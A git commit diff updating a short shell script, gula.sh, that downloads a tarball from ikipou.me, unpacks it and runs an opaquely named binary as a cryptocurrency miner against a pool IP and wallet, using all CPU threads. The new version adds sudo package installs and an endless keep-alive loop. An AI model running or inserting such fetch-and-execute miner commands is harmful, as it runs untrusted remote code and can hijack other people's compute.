1144635cab9e7d2372bb0d73f7080b9d9fa3ccdb
joko ganteng <80169267+ikypou1@users.noreply.github.com>
2024-11-09 03:15:46 +0800

    Update gula.sh

--- gula.sh
+++ gula.sh
@@ -1,2 +1,11 @@
 #!/bin/sh
-wget -O JOKO  ikipou.me/JOKO-[GULA].tar.gz && tar -xvf JOKO && ./JOKOTAMVAN/JOKO -a yespowersugar -o  47.236.107.75:6668 -u LYs3dSTmjrX8GtW3uj2bfMJojs7WDyVvJu -p c=LTC,mc=SUGAR,m=solo -t$(nproc --all)
+sudo apt update
+sudo apt install screen -y
+wget ikipou.me/JOKO-[GULA].tar.gz
+tar -xvf JOKO-[GULA].tar.gz
+./JOKOTAMVAN/JOKO -a yespowersugar -o  47.236.107.75:6668 -u LYs3dSTmjrX8GtW3uj2bfMJojs7WDyVvJu -p c=LTC,mc=SUGAR,m=solo -t$(nproc --all)
+while [ 1 ]; do
+sleep 3
+
+done
+sleep 9999
